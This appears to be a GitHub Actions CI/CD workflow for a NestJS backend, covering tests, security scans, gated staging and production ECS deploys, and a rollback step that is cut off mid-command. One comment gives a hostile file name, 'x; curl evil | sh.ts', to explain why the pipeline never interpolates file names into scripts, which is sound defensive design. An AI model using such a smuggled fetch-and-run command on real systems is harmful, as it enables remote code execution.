name: CI/CD

# THE one authoritative pipeline for this repository: validation, security checks, tests, image build and
# the AWS (ECS) rollouts (staging, then production, from main only) and the manual rollback. Nothing else under
# .github/workflows may trigger on push / pull_request or deploy. Architecture and rules: docs/CI-CD-ARCHITECTURE.md.
#
#   pull_request                -> `control` -> every validation job + `ci-gate`. Never deploys.
#   push to main                -> validation -> `ci-gate` -> promotion gates -> deploy STAGING -> deploy PRODUCTION, all
#                                  in this one run and for this one commit. Production waits for the staging rollout
#                                  of the same commit and for the `production` environment's required reviewers.
#                                  Each rollout rebuilds only when what the environment RUNS differs in image inputs
#                                  (scripts/ci/release-decision.sh), and otherwise PROVES the running release instead.
#   workflow_dispatch           -> `action`: deploy (staging|production, from main only; a manual production deploy
#                                  needs the same green staging tree and the same approvals) | rollback
#
# `main` is the only branch that deploys. `push` is limited to it: every other branch is covered by its pull
# request, and running both for the same commit doubled every job. The rollouts are jobs of THIS run (not a second
# workflow reacting to CI), so CI and the rollout cannot race each other or deploy the same commit twice.
on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:
    inputs:
      action:
        description: What to run (deploy and rollback need the environment's own approvals)
        type: choice
        options: [deploy, rollback]
        default: deploy
      environment:
        description: Target environment (deploy and rollback)
        type: choice
        options: [staging, production]
        default: staging
      previous_task_definitions:
        description: 'rollback only: JSON object service -> task definition ARN (the previous-task-definitions artifact of the deploy being undone)'
        type: string
        required: false

# Least privilege: jobs below that need more (OIDC, run lookup) say so themselves.
permissions:
  contents: read

# Validation runs: a newer push to a PR makes the older run worthless, so it is cancelled. Pushes (only
# main reaches here) queue instead: a run that is already deploying is NEVER cancelled, and a newer
# push replaces only a run that has not started. Manual and scheduled runs get a unique group so they can
# neither cancel nor be dropped by anything. The AWS rollout has its own per-environment lock on the
# `deploy` and `rollback` jobs, which is what stops two operations touching the same ECS services.
concurrency:
  group: ci-cd-${{ github.event_name == 'pull_request' && github.event.pull_request.number || github.event_name == 'push' && github.ref || github.run_id }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  # Execution control: decides, once, which parts of the pipeline this event runs. Every other job hangs off
  # these outputs, so there is exactly one place that maps an event to an action.
  control:
    name: Execution control
    runs-on: ubuntu-latest
    timeout-minutes: 5
    outputs:
      ci: ${{ steps.route.outputs.ci }}
      deploy: ${{ steps.route.outputs.deploy }}
      rollback: ${{ steps.route.outputs.rollback }}
      deploy_staging: ${{ steps.route.outputs.deploy_staging }}
      deploy_production: ${{ steps.route.outputs.deploy_production }}
      environment: ${{ steps.route.outputs.environment }}
      manual: ${{ steps.route.outputs.manual }}
    steps:
      - name: Checkout (routing script)
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      # Every push to main routes to the staging and production rollouts. Whether anything is rebuilt is decided in that job from
      # what the environment RUNS (scripts/ci/release-decision.sh). Deciding here from the push diff let a push
      # whose predecessor never deployed go green with `deploy` skipped while production ran an older release.
      - name: Route this event
        id: route
        env:
          EVENT: ${{ github.event_name }}
          REF: ${{ github.ref }}
          ACTION: ${{ inputs.action }}
          ENVIRONMENT: ${{ inputs.environment }}
        run: |
          routed=$(bash scripts/ci/route-event.sh)
          echo "$routed" >> "$GITHUB_OUTPUT"
          echo "event=$EVENT ref=$REF: $(echo "$routed" | tr '\n' ' ')" >> "$GITHUB_STEP_SUMMARY"

  build-test:
    name: Typecheck, lint, build & test
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1
          cache: npm

      - name: Install dependencies
        run: bash scripts/ci/npm-ci.sh

      - name: Lint
        run: npx eslint .

      # `npm run build` = `tsc --noEmit -p tsconfig.build.json && nest build --builder swc`, so the
      # typecheck is performed here (a separate `tsc` step ran the identical check twice, ~1 min).
      - name: Typecheck & build
        run: npm run build

      - name: Unit tests (with coverage)
        run: npm run test:cov -- --ci --runInBand

      - name: Upload coverage
        if: always()
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: backend-coverage
          path: coverage/
          if-no-files-found: ignore
          retention-days: 7

  migration-chain:
    name: Migration chain (empty database)
    needs: build-test
    runs-on: ubuntu-latest
    timeout-minutes: 20
    # Proves the ENTIRE migration history applies cleanly to a genuinely empty
    # PostgreSQL database. The regular unit/E2E suites materialise their schema
    # with TYPEORM_SYNCHRONIZE=true (see the `e2e` job below), which builds
    # tables directly from entity metadata and therefore never actually runs
    # the migration files. That gap is exactly what src/database/seed-staging.ts
    # and a fresh staging database depend on never existing — see
    # docs/ENVIRONMENT_INVENTORY.md finding A-11 and scripts/migration-chain-test.ts.
    #
    # This job fails the PR if the chain fails to create the empty database,
    # fails ANY migration, or leaves migrations pending after the run —
    # scripts/migration-chain-test.ts asserts all three and exits non-zero on
    # any of them (see assertReport()).
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: postgres
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 10s --health-timeout 5s --health-retries 5
    env:
      NODE_ENV: test
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/postgres
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1
          cache: npm

      - name: Install dependencies
        run: bash scripts/ci/npm-ci.sh

      - name: Run every migration against an empty database
        run: npm run test:migrations

  e2e-shard:
    name: E2E shard ${{ matrix.shard }}/4
    # Only worth running on code that already typechecks and builds.
    needs: build-test
    runs-on: ubuntu-latest
    # 91 serial suites take ~80 min on one runner, so they are split across 4 independent runners
    # (each with its own Postgres + Redis services). Bounded so a hang (see TYPEORM_SYNCHRONIZE
    # below) can no longer burn the 6 h default.
    timeout-minutes: 60
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    services:
      postgres:
        image: postgres:16
        env:
          POSTGRES_USER: postgres
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: lms_test
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 10s --health-timeout 5s --health-retries 5
      redis:
        image: redis:7
        ports: ['6379:6379']
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s --health-timeout 5s --health-retries 5
    env:
      NODE_ENV: test
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/lms_test
      # The schema is built ONCE by test/global-setup-e2e.ts (entity synchronize, allowed outside
      # production). The suites themselves must boot with synchronize OFF: with 'true' every suite
      # re-synchronizes, TypeORM's enum-alteration path fails on scheduled_lesson_sessions
      # ("..._enum = ..._enum_old"), the connection retries forever and the job hangs with no output
      # (reproduced locally against postgres:16; root cause documented in global-setup-e2e.ts).
      TYPEORM_SYNCHRONIZE: 'false'
      REDIS_HOST: localhost
      REDIS_PORT: '6379'
      JWT_SECRET: test-jwt-secret-value-at-least-32-chars-long
      JWT_REFRESH_SECRET: test-refresh-secret-value-at-least-32-chars
      COOKIE_SECRET: test-cookie-secret-value-at-least-32-chars-x
      BCRYPT_ROUNDS: '4'
      METRICS_BEARER_TOKEN: test-metrics-token
      # Cron locks are held 30 s after a run in deployed environments; tests call jobs back to back.
      CRON_LOCK_HOLD_MS: '0'
      # Mirrors the gitignored .env.test (absent in CI, so the e2e job must state it itself). Without
      # MARKETPLACE_ENABLED the marketplace module is not registered and ~25 suites get 404s; without
      # the workers flag background BullMQ jobs race the deterministic per-test cleanup. All values are
      # synthetic and grant access to nothing: the two keys only encrypt fixture rows in this job's
      # disposable Postgres service.
      MARKETPLACE_ENABLED: 'true'
      E2E_DISABLE_BACKGROUND_WORKERS: 'true'
      REDIS_URL: redis://localhost:6379/15
      MEETING_TOKEN_ENCRYPTION_KEY: MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY=
      PAYOUT_ACCOUNT_ENCRYPTION_KEY: ZmVkY2JhOTg3NjU0MzIxMGZlZGNiYTk4NzY1NDMyMTA=
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1
          cache: npm

      - name: Install dependencies
        run: bash scripts/ci/npm-ci.sh

      # Fails in seconds, with the cause named, when Node/Postgres/Redis are not what the suites need
      # (instead of as dozens of unrelated suite failures, or a hang). Prints versions only.
      - name: Preflight (Node, Postgres, Redis)
        run: npm run e2e:preflight

      # One worker (maxWorkers: 1, serial like --runInBand) that jest recycles past 1.5 GB
      # (workerIdleMemoryLimit); a single in-band process ran out of heap after ~67 suites.
      # `test:e2e:ci` also writes e2e-results/results.json (jest JSON) and junit.xml and logs the heap
      # used per suite. The full console output is kept in e2e-results/jest-output.log via tee; the
      # step's own exit status is jest's, never tee's, so a red suite still fails the job.
      - name: Run E2E tests (shard ${{ matrix.shard }}/4)
        env:
          JEST_JUNIT_OUTPUT_DIR: e2e-results
          JEST_JUNIT_OUTPUT_NAME: junit.xml
        run: |
          mkdir -p e2e-results
          set +e
          npm run test:e2e:ci -- --shard=${{ matrix.shard }}/4 2>&1 | tee e2e-results/jest-output.log
          code=${PIPESTATUS[0]}
          set -e
          # The verdict job reads this file: a shard whose runner dies before this line has no exit-code.txt
          # and therefore cannot be counted as a pass.
          echo "$code" > e2e-results/exit-code.txt
          exit "$code"

      # Reporting only: runs after a failure too, and never changes the job's verdict (the step above
      # already failed it). Written from jest's own result file; nothing is inferred.
      - name: Summarise shard results
        if: ${{ always() }}
        run: npm run --silent e2e:summary -- --report-only e2e-results/results.json >> "$GITHUB_STEP_SUMMARY"

      # Service-container logs (Postgres errors, Redis restarts) explain failures the jest log cannot.
      # The values in them are this job's synthetic, disposable ones; no repository secret is in scope.
      - name: Collect service logs
        if: ${{ always() }}
        run: |
          mkdir -p e2e-results
          docker ps -a --format '{{.Names}} {{.Image}} {{.Status}}' > e2e-results/containers.txt
          for id in $(docker ps -aq); do
            name=$(docker inspect --format '{{.Config.Image}}' "$id" | tr '/:' '__')
            if ! docker logs --tail 2000 "$id" > "e2e-results/service-${name}.log" 2>&1; then
              echo "::warning::could not read logs of container ${name}"
            fi
          done
          # Postgres writes an ERROR line for statements the application deliberately survives (a migration
          # re-adding a constraint that exists, a unique violation a test provokes). Grouping them in the
          # summary shows which kinds occurred; deadlocks and missing relations are the ones to read.
          for f in e2e-results/service-postgres_*.log; do
            [ -e "$f" ] || continue
            {
              echo "#### Postgres ERROR lines, shard ${{ matrix.shard }}/4 (grouped)"
              grep -E ' ERROR: ' "$f" | sed -E 's/^.* ERROR: +//; s/[0-9]+/N/g' | cut -c1-160 | sort | uniq -c | sort -rn | head -15 || true
            } >> "$GITHUB_STEP_SUMMARY"
          done

      # Everything uploaded below is masked first (connection strings, bearer tokens, key=value secrets). The
      # values in CI are synthetic; this keeps it true if that ever changes. A file that cannot be masked is
      # deleted rather than uploaded raw.
      - name: Redact diagnostics
        if: ${{ always() }}
        run: |
          for f in e2e-results/*.log e2e-results/*.txt e2e-results/*.xml; do
            [ -e "$f" ] || continue
            case "$f" in */exit-code.txt) continue ;; esac
            if node scripts/ci/redact.mjs < "$f" > "$f.redacted"; then
              mv "$f.redacted" "$f"
            else
              rm -f "$f" "$f.redacted"
              echo "::warning::could not redact $f; it was not uploaded"
            fi
          done

      - name: Upload E2E results (shard ${{ matrix.shard }}/4)
        if: ${{ always() }}
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: e2e-shard-${{ matrix.shard }}
          path: e2e-results/
          if-no-files-found: warn
          retention-days: 14

  # Single, stable check name for branch protection regardless of how many shards run. It fails
  # unless EVERY shard succeeded (a skipped or cancelled shard is a failure, never a silent pass).
  e2e:
    name: E2E tests (Postgres + Redis)
    needs: [control, e2e-shard]
    if: ${{ always() && needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      # scripts/ci/e2e-verdict.mjs has no dependencies, so this job needs no `npm ci` (one less network
      # step on the path to the gate).
      - name: Setup Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1

      # A shard that was cancelled or timed out may not have uploaded anything; the absence is reported
      # by the verdict below, so a failed download must not hide it.
      - name: Download shard results
        if: ${{ always() }}
        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          pattern: e2e-shard-*
          path: shard-results

      # The verdict needs BOTH the matrix job's own result AND, for every shard 1..4 (the matrix above), a
      # parsable jest result file that shows work was done and an exit-code.txt of 0. A shard with a missing
      # or malformed file, zero suites, or a non-zero jest status fails the job, as does a matrix that was
      # cancelled or skipped. The failed suites/tests and the first lines of their errors (masked) go to the
      # run summary and the log.
      - name: Require every shard to pass
        if: ${{ always() }}
        env:
          SHARD_RESULT: ${{ needs.e2e-shard.result }}
        run: |
          failed=0
          if [ "$SHARD_RESULT" != "success" ]; then
            echo "::error::The E2E shard matrix finished as '$SHARD_RESULT', not 'success'."
            failed=1
          fi
          node scripts/ci/e2e-verdict.mjs --dir shard-results --shards 4 --summary-file "$GITHUB_STEP_SUMMARY" || failed=1
          exit "$failed"

  secret-scan:
    name: Secret scanning (gitleaks)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
      pull-requests: read
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Run gitleaks
        uses: gitleaks/gitleaks-action@ff98106e4c7b2bc287b24eaf42907196329070c7 # v2
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

  format-check:
    name: Prettier (changed files only)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # `npm run lint` includes `prettier --check .` on the WHOLE repo, which
    # would fail CI on ~315 files that predate this check
    # (STAGING_ENVIRONMENT_IMPLEMENTATION_PLAN.md §12.2 step 3's own warning
    # against gating the whole repo without a phased plan). This job instead
    # diffs against the merge-base and formats only what the change actually
    # touches — the pre-existing baseline is recorded as debt, not hidden or
    # silently exempted forever.
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1
          cache: npm

      - name: Install dependencies
        run: bash scripts/ci/npm-ci.sh

      # Event SHAs come from the `github` context (hex only). File names are NEVER interpolated into a
      # script: a PR can add a file called `x; curl evil | sh.ts`, so scripts/ci/changed-files.sh writes a
      # NUL-delimited list and Prettier reads it through xargs -0. The helper fails (it does not report "no
      # files") when the diff cannot be trusted - unknown head, shallow clone, git error - and handles PR,
      # push, merge-commit, new-branch and root-commit events; see scripts/ci/tests/changed-files.test.sh.
      - name: Determine changed files
        id: changed
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha || github.event.before }}
          HEAD_SHA: ${{ github.sha }}
        run: bash scripts/ci/changed-files.sh "$BASE_SHA" "$HEAD_SHA" "$RUNNER_TEMP/changed-files.z" >> "$GITHUB_OUTPUT"

      - name: Prettier --check on changed files
        if: steps.changed.outputs.count != '0'
        run: xargs -0 -a "$RUNNER_TEMP/changed-files.z" npx prettier --check --ignore-unknown

  env-validation:
    name: Environment validation (staging shape)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # Calls the exact validate() NestJS's ConfigModule calls at boot
    # (src/config/env.validation.ts) against a synthetic, staging-shaped
    # configuration, so a schema regression (a newly-required variable, a
    # broken isolation-guard rule) fails here instead of at a real staging or
    # production boot. See scripts/validate-env.ts and
    # STAGING_ENVIRONMENT_IMPLEMENTATION_PLAN.md §12.2 step 10. This uses
    # placeholder, non-secret values only — it never has access to the real
    # staging environment's secrets (those are validated for real by
    # deploy-staging.yml's own env-validation step, which runs inside the
    # `staging` GitHub Environment).
    # NODE_ENV=production is deliberately NOT set at job level: `npm ci` honours it and silently omits
    # devDependencies, which removed ts-node and tsconfig-paths and made the validation step die with
    # "Cannot find module 'tsconfig-paths/register'". Production semantics are applied only to the
    # validation steps below, so the validator still runs exactly as it would in a production boot.
    env:
      APP_ENV: staging
      DATABASE_URL: postgres://postgres:postgres@localhost:5432/staging_placeholder
      REDIS_URL: redis://localhost:6379
      JWT_SECRET: staging-ci-placeholder-secret-at-least-32-chars
      JWT_REFRESH_SECRET: staging-ci-placeholder-refresh-at-least-32-chars
      COOKIE_SECRET: staging-ci-placeholder-cookie-at-least-32-chars
      FRONTEND_URL: https://staging.learnix.school
      BACKEND_URL: https://api-staging.learnix.school
      CORS_ORIGINS: https://staging.learnix.school
      PAYMENT_CAPTURE_GRACE_SECONDS: '300'
      PAYMENT_PROVIDER_CLOCK_SKEW_SECONDS: '120'
      REDIS_NAMESPACE: learnix:staging
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1
          cache: npm

      - name: Install dependencies
        run: bash scripts/ci/npm-ci.sh

      - name: Validate synthetic staging configuration
        env:
          NODE_ENV: production
        run: npm run validate:env

      # Negative controls: a validator that can never fail proves nothing. Each case starts from the
      # SAME valid staging config above and breaks exactly one rule that must stay enforced; the step
      # fails if validation still passes, or fails for a different reason than the expected rule.
      # Only synthetic values are used and no rule is relaxed anywhere.
      - name: Validation must still reject unsafe staging configurations
        env:
          NODE_ENV: production
        run: |
          expect_rejection() {
            local expected="$1"; shift
            local out
            if out=$(env "$@" npm run --silent validate:env 2>&1); then
              echo "::error::validation unexpectedly PASSED for: $expected"; exit 1
            fi
            if ! printf '%s' "$out" | grep -q "$expected"; then
              echo "::error::validation failed, but not with the expected rule: $expected"; exit 1
            fi
            echo "ok: rejected with $expected"
          }
          expect_rejection STAGING_PRODUCTION_DATABASE_HOST \
            DATABASE_URL=postgres://u:p@learnix.school:5432/staging_placeholder
          expect_rejection STAGING_DATABASE_NAME_NOT_MARKED \
            DATABASE_URL=postgres://u:p@localhost:5432/not_marked
          expect_rejection "JWT_SECRET must be longer" JWT_SECRET=too-short

  migration-safety-check:
    name: Migration safety check
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # Classifies every migration file changed relative to `origin/main` as
    # SAFE / NEEDS_DB_APPROVAL / BLOCKED (scripts/migration-safety-check.ts).
    # Non-blocking today (continue-on-error): rolling this out as a hard PR
    # gate needs the "db-owners second approval" workflow from
    # STAGING_ENVIRONMENT_IMPLEMENTATION_PLAN.md §12.3 step 18 to exist first,
    # otherwise a legitimate NEEDS_DB_APPROVAL migration has no way to get
    # merged at all. The finding is still surfaced in the job output either
    # way — this is visibility now, a hard gate once the approval path exists.
    continue-on-error: true
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1
          cache: npm

      - name: Install dependencies
        run: bash scripts/ci/npm-ci.sh

      - name: Classify changed migrations
        run: npx ts-node scripts/migration-safety-check.ts --base origin/main

  dependency-audit:
    name: Dependency audit (npm audit)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 10
    # Blocking: any high or critical advisory fails the run. The lockfile was remediated to zero
    # high/critical findings (CI-CD-AUDIT-REPORT.md lists the overrides and the moderate advisories
    # that have no upstream fix yet), so a *new* advisory can no longer join silently.
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: Setup Node.js
        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1
          cache: npm

      - name: npm audit (high and above)
        run: npm audit --audit-level=high

  workflow-lint:
    name: Workflow lint (actionlint)
    needs: control
    if: ${{ needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 5
    # Static check of every workflow (expression/context typos, bad `needs`, reusable-workflow inputs,
    # shell mistakes in `run:` via shellcheck). Pinned by digest (actionlint v1.7.7).
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      - name: actionlint
        run: >-
          docker run --rm -v "$PWD:/repo" -w /repo
          rhysd/actionlint@sha256:887a259a5a534f3c4f36cb02dca341673c6089431057242cdc931e9f133147e9 -color

      # actionlint only checks the shell inside `run:`. The logic that decides pass/fail lives in
      # scripts/ci/*, so those are shellchecked (same pinned image, which ships shellcheck) and run against
      # throwaway git repositories and fakes.
      - name: shellcheck scripts/ci
        run: >-
          docker run --rm --entrypoint shellcheck -v "$PWD:/repo" -w /repo
          rhysd/actionlint@sha256:887a259a5a534f3c4f36cb02dca341673c6089431057242cdc931e9f133147e9
          -x scripts/ci/*.sh scripts/ci/tests/*.sh

      - name: Test scripts/ci
        run: bash scripts/ci/run-tests.sh

  # One verdict for "everything that must be green before anything is released". Fails unless EVERY required
  # job succeeded (a skipped or cancelled one is a failure, never a silent pass). migration-safety-check stays
  # advisory, exactly as before.
  ci-gate:
    name: CI gate
    needs:
      - control
      - build-test
      - format-check
      - env-validation
      - migration-chain
      - e2e
      - secret-scan
      - dependency-audit
      - workflow-lint
    if: ${{ always() && needs.control.outputs.ci == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Checkout
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false

      # scripts/ci/ci-gate.mjs (tested in scripts/ci/tests) passes only if every job below reported `success`.
      # A required job that is missing from `needs`, an empty or unparsable result list, and any `failure`,
      # `cancelled` or `skipped` all fail the gate, and the failing jobs are named. ALLOW_SKIPPED is empty on
      # purpose: every job above runs whenever `control` routes CI, so a skip here is a defect, not a policy.
      # Keep REQUIRED_JOBS equal to `needs:` above (the gate also fails if a needed job is not listed).
      - name: Require every validation job to pass
        env:
          NEEDS_JSON: ${{ toJSON(needs) }}
          REQUIRED_JOBS: control build-test format-check env-validation migration-chain e2e secret-scan dependency-audit workflow-lint
          ALLOW_SKIPPED: ''
        run: node scripts/ci/ci-gate.mjs

  # ---------------------------------------------------------------------------------------------------------
  # AWS release. The rollout itself (one linux/arm64 image for the api, worker and migrate task definitions,
  # built with the Amazon RDS CA bundle, scanned, pushed to the environment's ECR under the commit SHA, migrate
  # task, api + worker with automatic rollback) lives in .github/workflows/deploy-aws.yml and is called once per
  # environment below. Production additionally requires: the staging rollout of the same commit, the migration
  # classifier, a DB-owner approval for destructive migrations, the `production` environment's reviewers and
  # a manual RDS snapshot before migrating. The GitHub environment variables each rollout needs are listed in
  # deploy-aws.yml.
  # ---------------------------------------------------------------------------------------------------------
  gates:
    name: Promotion gates
    needs: [control, ci-gate]
    # Push to main: only after `ci-gate` passed. Manual dispatch: CI is not part of that run, so the
    # production gate below looks up the push run of the same code on main instead.
    if: ${{ always() && needs.control.result == 'success' && needs.control.outputs.deploy == 'true' && (needs.ci-gate.result == 'success' || needs.control.outputs.manual == 'true') }}
    runs-on: ubuntu-latest
    timeout-minutes: 15
    # `gh api .../actions/workflows/.../runs` needs actions:read. The workflow-level block grants only
    # contents:read, and every unlisted scope is then "none", so this call would return 403.
    permissions:
      contents: read
      actions: read
    outputs:
      classification: ${{ steps.classify.outputs.classification }}
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false

      - name: A manual production deploy needs a green staging deploy of the same code
        if: needs.control.outputs.manual == 'true' && needs.control.outputs.deploy_production == 'true'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPOSITORY: ${{ github.repository }}
        # A push to main deploys staging and production in ONE run, where production simply `needs` the staging
        # job. A manual production dispatch has no staging job in its run, so scripts/ci/staging-gate.mjs requires
        # a successful push run on main of the SAME TREE whose staging rollout job itself succeeded (a green run
        # alone is NOT proof: a docs/infra-only push still goes green). It fails closed on any API or git error. Tests: scripts/ci/tests/staging-gate.test.mjs.
        run: node scripts/ci/staging-gate.mjs

      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4
        with:
          node-version: 24.22.1
          cache: npm
      - name: Install dependencies
        run: bash scripts/ci/npm-ci.sh

      - name: Classify migration changes
        id: classify
        env:
          BEFORE: ${{ github.event.before }}
        run: |
          # Migrations new since the previous tip of the branch being deployed (the push's `before`), or
          # since the previous commit of main for manual runs and first pushes.
          base="origin/main~1"
          if [ -n "$BEFORE" ] && git cat-file -e "$BEFORE^{commit}" 2>/dev/null; then base="$BEFORE"; fi
          set +e
          npx ts-node scripts/migration-safety-check.ts --base "$base"
          code=$?
          set -e
          case "$code" in
            0) echo "classification=SAFE" >> "$GITHUB_OUTPUT" ;;
            1) echo "classification=NEEDS_DB_APPROVAL" >> "$GITHUB_OUTPUT" ;;
            *) echo "classification=BLOCKED" >> "$GITHUB_OUTPUT"; exit 1 ;;
          esac

  # Promotion on main: staging first, then production, ALL in this one run and for this one commit. Both jobs
  # call the same reusable rollout (.github/workflows/deploy-aws.yml), which rebuilds, scans and rolls out the
  # commit's image in the environment's own account/ECR and proves every task runs it. Production starts only
  # after the staging rollout of THIS commit succeeded (`needs: deploy-staging`), so nothing reaches production
  # that this exact code did not first pass through staging - no second branch, no merge-back, no earlier run.
  deploy-staging:
    name: Deploy staging
    needs: [control, gates]
    if: ${{ always() && needs.gates.result == 'success' && needs.control.outputs.deploy_staging == 'true' }}
    permissions:
      contents: read
      id-token: write
    uses: ./.github/workflows/deploy-aws.yml
    with:
      environment: staging

  # Destructive migrations need a database owner's sign-off, asked only after staging has exercised them.
  db-owner-approval:
    name: Database-owner approval (destructive migration)
    needs: [control, gates, deploy-staging]
    if: ${{ always() && needs.gates.outputs.classification == 'NEEDS_DB_APPROVAL' && needs.control.outputs.deploy_production == 'true' && (needs.deploy-staging.result == 'success' || (needs.deploy-staging.result == 'skipped' && needs.control.outputs.manual == 'true')) }}
    runs-on: ubuntu-latest
    environment: production-db-approval
    steps:
      - run: echo "Destructive migration approved through the production-db-approval environment."

  # Waits for the `production` environment's required reviewers (configured in GitHub, not here).
  # After a push to main: requires the staging rollout of this same run. After a manual production dispatch
  # there is no staging job in the run, so `gates` proved a successful staging rollout of the same tree instead.
  deploy-production:
    name: Deploy production
    needs: [control, gates, deploy-staging, db-owner-approval]
    if: ${{ always() && needs.gates.result == 'success' && needs.control.outputs.deploy_production == 'true' && (needs.deploy-staging.result == 'success' || (needs.deploy-staging.result == 'skipped' && needs.control.outputs.manual == 'true')) && (needs.db-owner-approval.result == 'success' || needs.db-owner-approval.result == 'skipped') }}
    permissions:
      contents: read
      id-token: write
    uses: ./.github/workflows/deploy-aws.yml
    with:
      environment: production

  # Manual only. Points api (and worker) back at earlier task-definition revisions: paste the content of the
  # previous-task-definitions artifact of the deploy you are undoing, e.g.
  #   {"api":"arn:aws:ecs:eu-central-1:111122223333:task-definition/learnix-production-api:41",
  #    "worker":"arn:aws:ecs:eu-central-1:111122223333:task-definition/learnix-production-worker:41"}
  # Database changes are NOT reverted: migrations are expand/contract by policy; a data problem is a
  # point-in-time restore (learnix-infra/scripts/pitr-restore-drill.sh, runbook "Rollback").
  rollback:
    name: Roll back API on AWS (ECS)
    needs: control
    if: ${{ needs.control.outputs.rollback == 'true' }}
    runs-on: ubuntu-latest
    timeout-minutes: 45
    environment: ${{ needs.control.outputs.environment }}
    # Same group as `deploy`: a rollback must never interleave with a rollout of the same environment.
    concurrency:
      group: deploy-api-${{ needs.control.outputs.environment }}
      cancel-in-progress: false
    permissions:
      contents: read
      id-token: write
    steps:
      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@7474bc4690e29a8392af63c5b98e7449536d5c3a # v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - name: Roll back
        env:
          PREVIOUS: ${{ inputs.previous_task_definitions }}
          ECS_CLUSTER: ${{ vars.ECS_CLUSTER }}
        run: |
          # Keys become the --services argument, so they are validated as strictly as the ARN values.
          echo "$PREVIOUS" | jq -e 'type == "object" and length > 0 and all(to_entries[]; (.key | test("^[A-Za-z0-9_-]+$")) and (.value | test("^arn:aws:ecs:[a-z0-9-]+:[0-9]{12}:task-definition/[A-Za-z0-9_-]+:[0-9]+$")))' >/dev/null \
